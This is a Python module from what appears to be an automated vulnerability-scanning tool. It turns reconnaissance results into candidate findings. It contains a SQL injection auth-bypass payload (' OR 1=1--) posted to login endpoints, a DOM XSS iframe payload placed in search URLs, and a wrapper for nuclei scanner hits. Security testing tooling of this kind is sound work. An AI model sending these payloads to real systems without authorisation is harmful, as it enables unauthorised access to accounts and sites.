"""Deterministic candidate proposals from recon + signals (no LLM, no credit).

These are cheap guesses from common patterns (a login endpoint, a search param,
a scanner hit). They are deliberately liberal: the validator disproves the wrong
ones, so the finder's job is coverage, not certainty.
"""

from __future__ import annotations

import hashlib
import re
from urllib.parse import urlparse

from ..recon.http import Recon
from ..signal.base import Signal
from ..validator import Candidate, VulnClass

XSS_PAYLOAD = '<iframe src="javascript:alert(`xss`)">'
_SEARCH_PARAMS = {"q", "search", "query", "s"}
_LOGIN_RE = re.compile(r"/(login|signin|session|authenticate)(/|$|\?)", re.I)


def _sid(*parts: str) -> str:
    return hashlib.sha1("|".join(parts).encode()).hexdigest()[:8]


def _host(url: str) -> str:
    return urlparse(url).hostname or url


def heuristic_candidates(
    target_name: str, base_url: str, recon: Recon, signals: list[Signal]
) -> list[Candidate]:
    host = _host(base_url)
    out: list[Candidate] = []
    seen: set[str] = set()

    def add(cand: Candidate) -> None:
        if cand.id in seen:
            return
        seen.add(cand.id)
        out.append(cand)

    for ep in recon.endpoints:
        if _LOGIN_RE.search(ep):
            add(
                Candidate(
                    id=f"heur-sqli-{_sid(ep)}",
                    target_name=target_name,
                    vuln_class=VulnClass.INJECTION,
                    title=f"SQLi auth-bypass attempt on {ep}",
                    url=ep,
                    host=host,
                    source="heuristic",
                    params={
                        "requests": [
                            {
                                "method": "POST",
                                "url": ep,
                                "body": {"email": "' OR 1=1--", "password": "x"},
                            }
                        ],
                        "oracle": {"type": "contains", "value": "authentication"},
                    },
                )
            )

    if any(p.lower() in _SEARCH_PARAMS for p in recon.params):
        add(
            Candidate(
                id="heur-xss-search",
                target_name=target_name,
                vuln_class=VulnClass.XSS,
                title="DOM XSS via search parameter",
                url=f"{base_url.rstrip('/')}/#/search?q={XSS_PAYLOAD}",
                host=host,
                source="heuristic",
            )
        )

    for s in signals:
        if s.source == "nuclei":
            loc = s.location if s.location.startswith("http") else base_url
            add(
                Candidate(
                    id=f"heur-nuclei-{_sid(s.kind, s.location)}",
                    target_name=target_name,
                    vuln_class=VulnClass.OTHER,
                    title=f"nuclei:{s.kind} {s.message}".strip(),
                    url=loc,
                    host=host,
                    source="nuclei",
                    description=f"{s.severity}: {s.message}",
                )
            )
    return out
